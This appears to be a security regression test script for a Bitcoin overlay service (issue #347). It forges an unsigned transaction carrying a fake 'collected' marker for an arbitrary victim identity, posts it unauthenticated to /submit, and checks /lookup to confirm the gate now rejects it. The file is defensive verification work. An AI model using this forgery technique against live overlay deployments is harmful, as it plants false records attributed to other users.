#!/usr/bin/env node
/**
 * #347 ATTACK CELL — through the REAL `/submit` route (Rule 6b).
 *
 * Fabricates a BEEF for a transaction that HAS NEVER EXISTED ON THE NETWORK:
 * a junk input spending a random 32-byte "txid" that no miner has ever seen,
 * and one OP_RETURN output carrying a well-formed `LOW/collected/v1` marker
 * naming an arbitrary VICTIM identity + gameId.
 *
 * No wallet. No signature. No fee. No broadcast. One unauthenticated POST.
 *
 * This is the ROUTE-LEVEL cell for #347. The pure decision seam is pinned
 * natively in `crates/overlay-cloudflare/src/submit_gate.rs`, but a primitive
 * proof is a proof about a primitive (Rule 6b) — the gate had to be shown
 * live, through the real handler, because the defect WAS the wiring between
 * the header and the gate. `routes.rs::submit` takes a `worker::Request` and
 * cannot be driven from a native `cargo test`, so this HTTP cell is the only
 * way to reach the real producer path.
 *
 * Usage: node submit_gate_attack.mjs <overlay-base> <mode> [identityHex] [gameIdHex]
 *   MODE 'none' omits the header entirely (the default SPV-barred path).
 *   OP_TOKEN=<bearer> presents the operator credential.
 *
 * Stand the worker up with:
 *   cd crates/overlay-cloudflare && npx wrangler dev --local --port 8791 \
 *     --var TOPIC_MANAGERS:tm_collected --var LOOKUP_SERVICES:ls_collected \
 *     --var ADMIN_TOKEN:<tok> --var SUBMIT_ENFORCE:true
 *
 * RECORDED RESULTS (2026-08-05, worktree fix/347-submit-mode-gate):
 *
 *   BEFORE the fix (origin/main b896fcb), lenient or not:
 *     historical-tx-no-spv → 200 {"tm_collected":{"outputsToAdmit":[0]}}
 *                            /lookup → present:true  ← FABRICATION ADMITTED
 *     broadcast-gated      → 400 (EF conversion needs the real source tx)
 *
 *   AFTER, SUBMIT_ENFORCE=true:
 *     historical-tx-no-spv, no token   → 401, /lookup present:false  (closed)
 *     historical-tx-no-spv, bad token  → 401                          (fail-closed)
 *     historical-tx-no-spv, OP_TOKEN   → 200                          (peer sync intact)
 *     broadcast-gated                  → 400 EF (its OWN bar, untouched)
 *     no header                        → 400 SPV (its OWN bar, untouched)
 *   AFTER, SUBMIT_ENFORCE=false (rollout default):
 *     historical-tx-no-spv, no token   → 200 + unauthenticatedUngated=1 on
 *                                        /health/invariants (the soak signal)
 *   AFTER, ENABLE_EXTENSIONS=false (kill switch), lenient:
 *     historical-tx-no-spv             → 400 SPV, present:false — the header
 *                                        is ignored entirely
 */

import { randomFillSync } from 'node:crypto'

const BASE = process.argv[2] ?? 'http://127.0.0.1:8791'
const MODE = process.argv[3] ?? 'historical-tx-no-spv'
const VICTIM = process.argv[4] ?? '02'.padEnd(66, 'ab') // 33-byte compressed-looking key
const GAMEID = process.argv[5] ?? 'de'.repeat(32)

const enc = (s) => Buffer.from(s, 'hex')

/** Minimal Bitcoin data push (all our payloads are < 0x4c..0xff so 1 or 2 byte forms). */
function push(buf) {
  if (buf.length < 0x4c) return Buffer.concat([Buffer.from([buf.length]), buf])
  if (buf.length <= 0xff) return Buffer.concat([Buffer.from([0x4c, buf.length]), buf])
  throw new Error('push too big for this harness')
}

/** `OP_FALSE OP_RETURN <tag> <gameId> <identityKey> <sig>` — the v1 marker shape. */
function collectedMarkerScript(gameIdHex, identityHex) {
  const tag = Buffer.from('LOW/collected/v1', 'utf8') // 16 bytes
  const gameId = enc(gameIdHex) // 32
  const identity = enc(identityHex) // 33
  // A DER-SHAPED blob of a legal length (68..=74). The overlay never verifies
  // it — that is the whole point of the finding.
  const sig = Buffer.alloc(70, 0x41)
  return Buffer.concat([
    Buffer.from([0x00, 0x6a]),
    push(tag),
    push(gameId),
    push(identity),
    push(sig),
  ])
}

function varint(n) {
  if (n < 0xfd) return Buffer.from([n])
  if (n <= 0xffff) return Buffer.concat([Buffer.from([0xfd]), u16(n)])
  return Buffer.concat([Buffer.from([0xfe]), u32(n)])
}
const u16 = (n) => { const b = Buffer.alloc(2); b.writeUInt16LE(n); return b }
const u32 = (n) => { const b = Buffer.alloc(4); b.writeUInt32LE(n); return b }
const u64 = (n) => { const b = Buffer.alloc(8); b.writeBigUInt64LE(BigInt(n)); return b }

/** A raw tx with one unsigned junk input and one OP_RETURN marker output. */
function fabricatedRawTx(script) {
  const prevTxid = Buffer.alloc(32)
  // Random so every run is a fresh txid (no dedupe short-circuit).
  randomFillSync(prevTxid)
  return Buffer.concat([
    u32(1), // version
    varint(1), // input count
    prevTxid, u32(0), varint(0), Buffer.from([0xff, 0xff, 0xff, 0xff]), // EMPTY unlocking script
    varint(1), // output count
    u64(0), varint(script.length), script,
    u32(0), // locktime
  ])
}

/** Proofless V1 BEEF wrapping exactly one raw tx (the shape the tower sends). */
function beefV1(rawTx) {
  return Buffer.concat([
    Buffer.from([0x01, 0x00, 0xbe, 0xef]), // BEEF_V1 = 0xEFBE0001, to_le_bytes() = 01 00 BE EF
    varint(0), // nBUMPs
    varint(1), // nTransactions
    rawTx,
    Buffer.from([0x00]), // hasBump = false
  ])
}

const script = collectedMarkerScript(GAMEID, VICTIM)
const beef = beefV1(fabricatedRawTx(script))

// MODE === 'none' omits the header entirely — the DEFAULT path (SubmitMode::CurrentTx).
const headers = {
  'Content-Type': 'application/octet-stream',
  'x-topics': JSON.stringify(['tm_collected']),
}
if (MODE !== 'none') headers['x-submit-mode'] = MODE
if (process.env.OP_TOKEN) headers['Authorization'] = `Bearer ${process.env.OP_TOKEN}`

const res = await fetch(`${BASE}/submit`, { method: 'POST', headers, body: beef })
const body = await res.text()
console.log(`mode=${MODE} status=${res.status}`)
console.log(body.slice(0, 600))

// Now read it back through the public lookup — did the fabrication land?
const look = await fetch(`${BASE}/lookup`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    service: 'ls_collected',
    query: { type: 'collectedFor', identity: VICTIM, gameIds: [GAMEID] },
  }),
})
console.log(`lookup status=${look.status}`)
console.log((await look.text()).slice(0, 600))
